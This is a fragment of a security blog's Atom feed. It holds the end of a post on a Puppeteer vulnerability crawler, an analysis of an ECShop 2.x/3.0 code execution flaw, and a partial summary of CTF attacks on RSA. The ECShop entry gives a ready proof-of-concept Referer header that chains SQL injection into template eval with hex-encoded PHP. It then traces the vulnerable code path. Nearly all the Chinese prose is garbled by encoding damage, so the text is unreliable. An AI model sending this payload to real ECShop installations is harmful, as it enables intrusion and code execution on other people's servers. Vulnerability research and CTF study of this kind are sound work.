title="æ‹¦æˆªlogoutè¯·æ±‚"></a>æ‹¦æˆªlogoutè¯·æ±‚</h3><p>é¿å…çˆ¬è™«çˆ¬è¡Œåˆ°ç™»å‡ºé“¾æ¥ï¼Œå¯¼è‡´Cookieå¤±æ•ˆï¼Œè¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ‹¦æˆªï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(interceptedRequest.url().indexOf(<span class="string">"logout"</span>) !== <span class="number">-1</span>)&#123;</span><br><span class="line">        interceptedRequest.abort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="puppeteerå¹¶å‘å¼‚æ­¥è°ƒåº¦æ–¹æ¡ˆ"><a href="#puppeteerå¹¶å‘å¼‚æ­¥è°ƒåº¦æ–¹æ¡ˆ" class="headerlink" title="puppeteerå¹¶å‘å¼‚æ­¥è°ƒåº¦æ–¹æ¡ˆ"></a>puppeteerå¹¶å‘å¼‚æ­¥è°ƒåº¦æ–¹æ¡ˆ</h2><p>ç®€å•ç²—æš´ï¼Œè¿™é‡Œä½¿ç”¨<a href="https://github.com/thomasdondorf/puppeteer-cluster#api" target="_blank" rel="noopener">puppeteer-cluster</a>åº“è§£å†³å•Chromeå¤štabå¹¶å‘éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥å‚è€ƒä½¿ç”¨guimaiziå¸ˆå‚…çš„demo:<a href="https://www.guimaizi.com/archives/535" target="_blank" rel="noopener">puppeteerå¼‚æ­¥å¹¶å‘æ–¹æ¡ˆ</a></p><h2 id="å¼€æº"><a href="#å¼€æº" class="headerlink" title="å¼€æº"></a>å¼€æº</h2><p>è¿™é‡Œè¾¹å…¶å®è¿˜æœ‰å¾ˆå¤šå‘è¦å¡«ï¼Œå¸ˆå‚…ä»¬å¤šæŒ‡ç‚¹äº¤æµ~<br>å¼€æºé“¾æ¥ï¼š<a href="https://github.com/Passer6y/CrawlerVuln" target="_blank" rel="noopener">https://github.com/Passer6y/CrawlerVuln</a><br>ï¼ˆæ±‚star</p><h2 id="å¾…å®ç°çš„éœ€æ±‚"><a href="#å¾…å®ç°çš„éœ€æ±‚" class="headerlink" title="å¾…å®ç°çš„éœ€æ±‚"></a>å¾…å®ç°çš„éœ€æ±‚</h2><p><strong>å¼¹çª—å–æ¶ˆ</strong></p><p><strong>ä»£ç æ³¨å…¥æ—¶é—´</strong><br>é“¾æ¥æ”¶é›†æœ‰ç‚¹ä¸å¤ªå…¨ï¼Œè§¦å‘å®Œäº†äº‹ä»¶åå¾—ç­‰ä¸€ä¼šå†æ”¶é›†urlã€‚</p><p><strong>å¾…è§£å†³çš„bug</strong><br><code>page.once</code> ç¡®å®šæŠ“å–é“¾æ¥æ—¶é—´</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ–‡ç« é¦–å‘å…ˆçŸ¥ç¤¾åŒºï¼š&lt;a href=&quot;https://xz.aliyun.com/t/7064&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7064&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;åœ¨ä¸¤å¹´å‰è°·æ­Œæ¨å‡ºäº†ä¸€ä¸ªHeadless Chrome NodeJS API:&lt;a href=&quot;https://github.com/puppeteer/puppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Puppeteer&lt;/a&gt;ï¼Œåæ¥Githubä¸€ä¸ªå¤§ç‰›ç”¨Pythonå°è£…äº†ä¸€å¥—apiï¼Œä½œä¸ºä¸€ä¸ªç¬¬ä¸‰æ–¹api:&lt;a href=&quot;https://github.com/miyakogi/pyppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Pyppeteer&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å»å¹´çš„æ—¶å€™ï¼Œå°è¯•è¿‡ç”¨Pyppeteerå†™è¿‡åŠ¨æ€çˆ¬è™«ï¼ŒPythonç‰ˆç”±äºæ˜¯ç¬¬ä¸‰æ–¹ä¸€ä¸ªä½œè€…å°è£…çš„ï¼Œæ›´æ–°å¾ˆæ…¢ï¼Œè½åå®˜æ–¹ç‰ˆæœ¬å¾ˆå¤šï¼Œå¾ˆå¤šè¿·ä¹‹BUGï¼Œæ¯”å¦‚CDPåè®®å»æ“ä½œè¿œç¨‹chromiumï¼Œå¾ˆå®¹æ˜“ä¸­æ–­å¯¼è‡´ä¸€å †åƒµå°¸è¿›ç¨‹çš„chromiumå…³ä¸æ‰ã€‚è™½ç„¶æœ€åè¿˜æ˜¯é¡¶ç€å„ç§bugï¼Œå†™æˆä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„å·¥å…·ï¼Œä½†åœ¨æœåŠ¡å™¨ä¸Šå¾ˆåƒå†…å­˜ï¼Œä¸€æ–¹é¢ä¹Ÿæ˜¯å› ä¸ºå†™çš„ä»»åŠ¡è°ƒåº¦æœºåˆ¶ä¹Ÿæœ‰ä¸€äº›é—®é¢˜ï¼Œæœ€åæœå½¹äº†è®¸å¤šå¤©å¤©ï¼Œä¸æƒ³ç»´æŠ¤äº†ï¼Œæ¡äº†å‡ ä¸ªæ¼æ´å°±é€€ä¼‘äº†ã€‚åæ¥åœ¨å¹³æ—¶çš„å·¥ä½œå’Œå­¦ä¹ ä¸­é¢‘é¢‘æ¥è§¦åˆ°nodeJSï¼Œäºæ˜¯å°±è¶ç€è¿™æ®µæ—¶é—´ç”¨nodejsé‡æ–°å®ç°ä¸€éã€‚&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="https://0day.design/tags/Code/"/>
    
      <category term="Web" scheme="https://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ECShop 2.x 3.0ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2019/09/30/ECShop%202.x%203.0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2019/09/30/ECShop 2.x 3.0ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ/</id>
    <published>2019-09-30T14:10:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ¸—é€æ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªç«™ï¼Œå½“æ—¶çœ‹åˆ°è¿™ä¸ªäºŒæ¬¡æ³¨å…¥å¼•å‘çš„å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹æœ‰ç‚¹æ„æ€ï¼Œäºæ˜¯æŠ½äº†ä¸ªæ—¶é—´ç®€å•çš„å¤ç°åˆ†æäº†ä¸€ä¸‹<br><a id="more"></a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰æ¸—é€æ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªç«™ï¼Œå½“æ—¶çœ‹åˆ°è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹æœ‰ç‚¹ä¸œè¥¿ï¼Œäºæ˜¯æŠ½äº†ä¸ªæ—¶é—´å¤ç°ä¸€ä¸‹</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>IDE: PHPstorm<br>ä»£ç ï¼š<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/30/ECShop 2.x 3.0ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ/media/15696548589918/15696662119731.jpg" alt="-w1613"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>user.php 305è¡Œæ¸²æŸ“çš„ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰user.phpï¼Œ åˆ™$back_actä¸ºreferer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330è¡Œ</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// æ¸²æŸ“refereråˆ°æ¨¡æ¿</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p><p>è·Ÿè¿›<code>display</code>å‡½æ•°ï¼Œincludes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 106è¡Œ</span><br><span class="line">$out = $this-&gt;fetch($filename, $cache_id);  // fetchæ¨¡æ¿ï¼Œæ¸²æŸ“å˜é‡</span><br><span class="line"></span><br><span class="line">if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">&#123;</span><br><span class="line">    $k = explode($this-&gt;_echash, $out); // _echashä¸ºå®šå€¼</span><br><span class="line">    foreach ($k AS $key =&gt; $val)</span><br><span class="line">    &#123;</span><br><span class="line">        if (($key % 2) == 1)    // å¦‚æœæ˜¯å¥‡æ•°ä¸ª</span><br><span class="line">        &#123;       </span><br><span class="line">                // 45ea207d7a2b68c49582d2d22adf953aè¿™ä¸ªç›¸å½“äºåˆ†å‰²ç¬¦ï¼Œæ–¹ä¾¿ä»htmlæå–å‡ºåºåˆ—åŒ–æ•°æ®</span><br><span class="line">            $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $out = implode(&apos;&apos;, $k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è·Ÿè¿›<code>insert_mod</code>å‡½æ•°ï¼Œincludes/cls_template.php 1168è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // å¤„ç†åŠ¨æ€å†…å®¹</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name); // |å‰çš„ä¸ºå‡½æ•°åï¼Œåä¸ºå‚æ•°</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);     // å¯ä»¥æ‰§è¡Œinsert_å¼€å¤´çš„å‡½æ•°</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥é€šè¿‡æ§åˆ¶refererï¼Œæ‰§è¡Œ<code>insert_</code>å¼€å¤´çš„ä»»æ„å‡½æ•°ï¼Œæ¥çœ‹includes/lib_insert.phpï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 141è¡Œ</span><br><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    // arrå¯æ§ï¼Œå½¢æˆsqlæ³¨å…¥ï¼Œ ç»§ç»­å¾€ä¸‹è·Ÿ</span><br><span class="line"></span><br><span class="line">// 170è¡Œ</span><br><span class="line">    foreach ($res AS $row)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // æŸ¥åº“çš„ç¬¬2åˆ—å­—æ®µ</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[&apos;position_style&apos;]; // æŸ¥åº“çš„ç¬¬9åˆ—</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">        $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // é‡æ–°å¸¦å…¥æ¨¡æ¿æ¸²æŸ“</span><br></pre></td></tr></table></figure></p><p>æ¥ç€ï¼Œincludes/patch/includes_cls_template_fetch_str.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = $this;</span><br><span class="line">return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source);</span><br></pre></td></tr></table></figure></p><p>è°ƒselectå‡½æ•°ï¼Œincludes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//375è¡Œ </span><br><span class="line">return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>includes/cls_template.php <code>get_val</code>593è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// å¤„ç†æ‰å˜é‡æ ‡ç­¾</span><br><span class="line">$p = $this-&gt;make_var($val);</span><br></pre></td></tr></table></figure></p><p>è·Ÿè¿›<code>make_var</code>, includes/cls_template.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 705è¡Œ</span></span><br><span class="line">    <span class="keyword">return</span> $p;</span><br></pre></td></tr></table></figure></p><p>ä»£ç æ‰§è¡Œï¼Œincludes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1193è¡Œ</span><br><span class="line">function _eval($content)</span><br><span class="line">&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content));</span><br><span class="line">    $content = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line"></span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¹‹å‰æ¸—é€æ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªç«™ï¼Œå½“æ—¶çœ‹åˆ°è¿™ä¸ªäºŒæ¬¡æ³¨å…¥å¼•å‘çš„å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹æœ‰ç‚¹æ„æ€ï¼Œäºæ˜¯æŠ½äº†ä¸ªæ—¶é—´ç®€å•çš„å¤ç°åˆ†æäº†ä¸€ä¸‹&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://0day.design/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSAå°ç»“</title>
    <link href="https://0day.design/2019/04/27/RSA%E5%B0%8F%E7%BB%93/"/>
    <id>https://0day.design/2019/04/27/RSAå°ç»“/</id>
    <published>2019-04-27T12:46:00.000Z</published>
    <updated>2020-03-19T12:47:56.506Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ‰“æ¯”èµ›é¢‘é¢‘é‡åˆ°å„ç§å­¦è¿‡åˆä¸ä¼šçš„å¯†ç å­¦â€¦ æŠ½äº†ç‚¹æ—¶é—´æ£é¼“äº†ä¸€ä¸‹å¸¸è§rsaæ”»å‡»æ–¹æ³•çš„åŸç†ï¼Œä»¥åæœ‰æ—¶é—´ç»§ç»­å¡«å‘<br><a id="more"></a></p><h1 id="RSAè®¡ç®—è¿‡ç¨‹"><a href="#RSAè®¡ç®—è¿‡ç¨‹" class="headerlink" title="RSAè®¡ç®—è¿‡ç¨‹"></a>RSAè®¡ç®—è¿‡ç¨‹</h1><p>æ¶‰åŠ3ä¸ªå‚æ•°ï¼š n e d, å…¶ä¸­ {n, d}ä¸ºç§é’¥ï¼Œ{n, e}ä¸ºå…¬é’¥</p><p><code>phi(n) = (p-1) * (q-1)</code><br>dä¸ºeè†œphi(n)çš„é€†å…ƒ(phi(n)ä¸ºnçš„æ¬§æ‹‰å‡½æ•°)</p><p><code>ed â‰¡ 1 (mod phi(n))</code></p><p>åŠ å¯†è§£å¯†è¿‡ç¨‹ï¼šcå¯†æ–‡ï¼Œmæ˜æ–‡<br>åŠ å¯†ï¼š<code>c â‰¡ m^e(mod n)</code><br>è§£å¯†ï¼š<code>m â‰¡ c^d(mod n)</code></p><p>rsaä¸­eä¸ºéšæœºé€‰å–çš„ä¸€ä¸ªæ•°ï¼Œä¸€èˆ¬ä¸º65537<br>nç”±ä¸¤ä¸ªå¤§ç´ æ•°(p,q)ä¹‹ç§¯ç»„æˆï¼Œå…¬é’¥{n,e}ä¸ºå…¬å¼€çš„ï¼Œè¦ç ´è§£rsaå°±å¾—æ±‚å‡ºdï¼Œdä¸ºeæ¨¡phi(n)çš„é€†å…ƒï¼Œè¦æ±‚å‡ºphi(n)ï¼Œå¿…é¡»åˆ†è§£næ±‚å¾—p,qï¼Œä»è€Œæ±‚å¾—<code>phi(n)=(p-1)*(q-1)</code></p><h1 id="ä»£ç åŸºç¡€"><a href="#ä»£ç åŸºç¡€" class="headerlink" title="ä»£ç åŸºç¡€"></a>ä»£ç åŸºç¡€</h1><ol><li>powå‡½æ•°ï¼š<br>pythonåº•å±‚å®ç°å¹³æ–¹ä¹˜å’Œç®—æ³•<br>è§£å¯†ï¼š<code>m â‰¡ c^d(mod n)</code>ä½¿ç”¨powå‡½æ•°<br><code>m=pow(c,d,n)</code></li></ol><h1 id="æ•°æ®å¤„ç†"><a href="#æ•°æ®å¤„ç†" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h1><p>é€šè¿‡é¢˜ç›®çš„æ•°æ®æ–‡ä»¶ï¼Œæ‰‹å·¥å°†å‚æ•°æå–ï¼š</p><ol><li>pemæ–‡ä»¶<br>1.1 ç§é’¥è§£å¯†flagï¼š<br><code>openssl rsautl -decrypt -in flag -inkey private.pem -out flag.txt</code><br>1.2 å…¬é’¥åŠ å¯†flag<br><code>openssl  rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</code><br>1.3 è·å–å…¬é’¥çš„ä¿¡æ¯<br><code>openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></li></ol><ol start="2"><li>pcapæ–‡ä»¶</li><li>PPCæ¨¡å¼</li></ol><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="ç›´æ¥åˆ†è§£n"><a href="#ç›´æ¥åˆ†è§£n" class="headerlink" title="ç›´æ¥åˆ†è§£n"></a>ç›´æ¥åˆ†è§£n</h2><p>n &lt; 512 bit: ç›´æ¥åˆ†è§£ï¼Œ <a href="https://factordb.com" target="_blank" rel="noopener">https://factordb.com</a><br>n &gt; 512 bit: ä½¿ç”¨åé¢æ–¹æ³•</p><h2 id="åˆ©ç”¨å…¬çº¦æ•°"><a href="#åˆ©ç”¨å…¬çº¦æ•°" class="headerlink" title="åˆ©ç”¨å…¬çº¦æ•°"></a>åˆ©ç”¨å…¬çº¦æ•°</h2><p>é¢˜ç›®ç‰¹å¾ï¼šç›´æ¥åˆ†è§£næ— æœåï¼Œå°è¯•yafuã€‚</p><p>ä¸¤æ¬¡å…¬é’¥åŠ å¯†æ—¶ä½¿ç”¨çš„n1å’Œn2æœ‰ç›¸åŒçš„ç´ å› å­ï¼Œåˆ™å¯ä»¥ç”¨æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡ºn1å’Œn2çš„æœ€å¤§å…¬å› æ•°ï¼Œä¹Ÿå°±æ˜¯å…¶ä¸­ä¸€ä¸ªç´ å› å­ã€‚</p><p>é¢˜ç›®ç‰¹å¾ï¼šç»™äº†è‹¥å¹²ä¸ªnï¼Œå‡ä¸åŒï¼Œå¹¶ä¸”néƒ½æ˜¯2048bitã€4096bitçº§åˆ«ã€‚</p><h2 id="Fermatæ–¹æ³•ä¸Pollard-rhoæ–¹æ³•"><a href="#Fermatæ–¹æ³•ä¸Pollard-rhoæ–¹æ³•" class="headerlink" title="Fermatæ–¹æ³•ä¸Pollard rhoæ–¹æ³•"></a>Fermatæ–¹æ³•ä¸Pollard rhoæ–¹æ³•</h2><p>pã€qç›¸å·®è¿‡å¤§æˆ–ç›¸è¿‘æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Fermatæ–¹æ³•ä¸Pollard rhoæ–¹æ³•åˆ†è§£nã€‚</p><p>å¼€æºé¡¹ç›®: yafu</p><h2 id="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"><a href="#ä½åŠ å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</h2><p>å½“e(e=3)å’Œæ˜æ–‡è¿‡å°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ”»å‡»æ–¹æ¡ˆï¼š</p><ol><li><code>m^e&lt;n</code>æ—¶<br>åŠ å¯†å‡½æ•°ä¸ºï¼š<code>c â‰¡ m^e(mod n)</code>ï¼Œ è‹¥m^3&lt;nï¼Œ ç›´æ¥å¯¹å¯†æ–‡cè¿›è¡Œå¼€ä¸‰æ¬¡æ–¹å³å¯è§£å‡ºæ˜æ–‡ã€‚<br>ä¾‹é¢˜ï¼š</li></ol><ol start="2"><li><code>m^e&gt;n</code>æ—¶<br><code>c â‰¡ m^e + k*n</code>, å¯¹<code>c+kn</code>è¿›è¡Œä¸‰æ¬¡å¼€æ–¹ï¼Œå¹¶å¯¹kè¿›è¡Œæšä¸¾ï¼Œå³å¯æ±‚å¾—æ˜æ–‡mã€‚</li></ol><h2 id="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"><a href="#ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»</h2><p>é¢˜ç›®ç‰¹å¾ï¼šä¸€èˆ¬æ¥è¯´éƒ½æ˜¯ç»™äº†ä¸‰ç»„åŠ å¯†çš„å‚æ•°å’Œæ˜å¯†æ–‡ï¼Œå…¶ä¸­é¢˜ç›®å¾ˆæ˜ç¡®åœ°èƒ½å‘Šè¯‰ä½ è¿™ä¸‰ç»„çš„æ˜æ–‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”eéƒ½å–äº†ä¸€ä¸ªè¾ƒå°çš„æ•°å­—ã€‚</p><p>åˆ†æï¼šåŠ å¯†æŒ‡æ•°eé€‰å–è¾ƒå°ï¼Œä¸”ä½¿ç”¨ç›¸åŒåŠ å¯†æŒ‡æ•°è¿›è¡Œç¾¤å‘æ¶ˆæ¯(nä¸åŒ)ï¼Œå¯ä»¥ä½¿ç”¨å¹¿æ’­æ”»å‡»è·å¾—æ˜æ–‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1 â‰¡ m^e(mod n1)</span><br><span class="line">c2 â‰¡ m^e(mod n2)</span><br><span class="line">c3 â‰¡ m^e(mod n3)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼Œè§£å‡º<code>m^e</code>ï¼š<br><img src="https://static.zybuluo.com/Passer6y/4e9xj3u7mweeimm65v6arw5v/image_1d9c6jjt8bqdrao66julv1vn59.png" alt="image_1d9c6jjt8bqdrao66julv1vn59.png-78.6kB"></p><p>ç”±äºeå¾ˆå°ï¼Œæ‰€ä»¥å¯¹<code>m^e</code>è¿›è¡Œå¼€æ–¹å³å¯è§£å‡º</p><h2 